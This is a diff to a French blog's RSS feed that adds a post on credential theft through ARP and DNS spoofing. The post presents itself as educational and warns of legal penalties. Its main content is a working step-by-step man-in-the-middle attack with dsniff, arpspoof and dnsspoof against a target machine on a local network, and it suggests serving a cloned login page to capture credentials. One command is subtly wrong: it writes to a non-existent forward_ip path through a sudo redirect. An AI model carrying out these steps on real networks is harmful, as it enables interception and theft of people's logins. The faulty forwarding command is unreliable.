@@ -5,8 +5,54 @@
         <description>Recent content in Posts on Bienvenue sur le site de Lean Deep</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 10 Apr 2021 20:49:00 +0200</lastBuildDate>
+        <lastBuildDate>Sat, 17 Apr 2021 19:00:00 +0200</lastBuildDate>
         <atom:link href="https://leandeep.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Comment un hacker peut vous voler vos credentials en 5 minutes</title>
+            <link>https://leandeep.com/comment-un-hacker-peut-vous-voler-vos-credentials-en-5-minutes/</link>
+            <pubDate>Sat, 17 Apr 2021 19:00:00 +0200</pubDate>
+            
+            <guid>https://leandeep.com/comment-un-hacker-peut-vous-voler-vos-credentials-en-5-minutes/</guid>
+            <description>On croit toujours que ce sont les autres qui se hacker. &amp;ldquo;Cela n&amp;rsquo;arrive qu&amp;rsquo;aux autres&amp;rdquo;, on se sent protégé derrière son petit écran. Pourtant nous sommes des cibles faciles pour les hackers car parfois il suffit d&amp;rsquo;exécuter moins d&amp;rsquo;une dizaine de commandes pour mettre en place des pièges redoutables. Dans cet article, qui a purement un but pédagogique, nous allons voir à quel point il est simple de faire croire à quelqu&amp;rsquo;un qu&amp;rsquo;il navigue sur le site de son choix alors qu&amp;rsquo;il a attéri sur un site détenu par un hacker.</description>
+            <content type="html"><![CDATA[<p>On croit toujours que ce sont les autres qui se hacker. &ldquo;Cela n&rsquo;arrive qu&rsquo;aux autres&rdquo;, on se sent protégé derrière son petit écran. Pourtant nous sommes des cibles faciles pour les hackers car parfois il suffit d&rsquo;exécuter moins d&rsquo;une dizaine de commandes pour mettre en place des pièges redoutables. Dans cet article, qui a purement <strong>un but pédagogique</strong>, nous allons voir à quel point il est simple de faire croire à quelqu&rsquo;un qu&rsquo;il navigue sur le site de son choix alors qu&rsquo;il a attéri sur un site détenu par un hacker. Encore une fois, cet article a un but pédagogique. Il est strictement interdit d&rsquo;appliquer cette technique sur des ordinateurs et un réseau dont vous n&rsquo;êtes pas propriétaire. Vous encourez jusqu&rsquo;à deux ans d&rsquo;emprisonnement et 60 000 € d&rsquo;amende&hellip; Ceci étant dit et étant dédouané de toute responsabilité, nous allons voir comment réaliser un Man in the middle en spoofant un DNS et en redirigeant le traffic du navigateur vers un serveur Web.
+Il est selon moi important de comprendre à quel point ces techniques sont simples à mettre en place pour être sensibilisé, être (pourquoi pas) paranoïaque et surtpout pour mieux se protéger. Que diriez-vous si un hacker s&rsquo;était connecté à votre bancaire car vous lui aviez donné vos identifiants ?
+Et ne croyez pas qu&rsquo;un simple SMS de validation suffise&hellip; Un réseau 4G peut également se faire pirater. Je vous invite à faire des recherches sur les IMSI catchers&hellip; Pour 300€ un hacker peut s&rsquo;en fabriquer un en 2021 et intercepter vos SMS&hellip;</p>
+<br/>
+<h1 id="installation-des-outils-sur-kali-linux">Installation des outils sur Kali Linux</h1>
+<p>Ouvrir un terminal et installer les packages suivants:</p>
+<pre><code>sudo apt install dsniff bridge-utils -y
+sudo echo 1 &gt; /proc/sys/net/ipv4/forward_ip
+</code></pre><br/>
+<h1 id="configuration-du-dns">Configuration du DNS</h1>
+<p>N&rsquo;importe où dans votre machine Kali créer un fichier appelé <code>spoof_url.txt</code> et ajouter les URLs que vous souhaitez spoofer.</p>
+<pre><code>192.168.43.109 www*
+192.168.43.109 leandeep.com
+</code></pre><blockquote>
+<p><code>192.168.43.109</code> est l&rsquo;adresse IP de ma machine Kali</p>
+</blockquote>
+<br/>
+<h1 id="arp-spoofing-de-votre-cible">ARP Spoofing (de votre cible)</h1>
+<p>Récupérer l&rsquo;adresse IP de la machine cible. Dans notre exemple, elle a l&rsquo;IP <code>192.168.43.5</code>.
+Dans un nouveau terminal, exécuter la commande suivante:</p>
+<pre><code>sudo -s
+arpspoof -t 192.168.43.5 192.168.43.1 &amp;&amp; arpspoof -t 192.168.43.1 192.168.43.5 
+</code></pre><br/>
+<h1 id="démarrage-du-serveur-web-sur-kali">Démarrage du serveur Web sur Kali</h1>
+<p>Donner au fichier localisé dans <code>/var/www/html/index.html</code> le contenu HTML que vous voulez que votre cible voit.
+Example sans intérêt, dont un hacker ne se contentera pas:</p>
+<pre><code>&lt;h1&gt;Hello World&lt;/h1&gt;
+</code></pre><br/>
+<h1 id="démarrage-du-serveur-dns">Démarrage du serveur DNS</h1>
+<pre><code>dnsspoof -f Desktop/spoof_url.txt host 192.168.43.5 and udp port 53
+</code></pre><br/>
+<h1 id="résultat">Résultat</h1>
+<p>Sur la machine cible/victime, ouvrez votre navigateur et rendez-vous sur le site que vous avez &ldquo;spoofé&rdquo;. Vous verrez que le contenu de votre serveur web. <strong>Au lieu d&rsquo;avoir Hello World, si un hacker avait mis un clone du site que vous vouliez voiret que vous aviez tenté de vous y connecter, il aurait pu récupérer vos credentials.</strong> C&rsquo;est aussi simple que cela et créer un clone d&rsquo;un site existant ne prend que quelques minutes. Il suffit de l&rsquo;aspirer automatiquement avec des outils dédiés à cela et modifier 2 ou 3 choses et c&rsquo;est tout!</p>
+<p><img src="/images/spoof-dns.png" alt="image"></p>
+<p><strong>La prochaine fois que vous vous connecterez à un réseau publique gratuit, réfléchissez bien à ce que vous faites 😜</strong></p>
+<p>Personnellement, j&rsquo;utilise un secured VPN dès que je sors de chez moi.</p>
+]]></content>
+        </item>
         
         <item>
             <title>The cutest dog of the InterPlanetary File System</title>
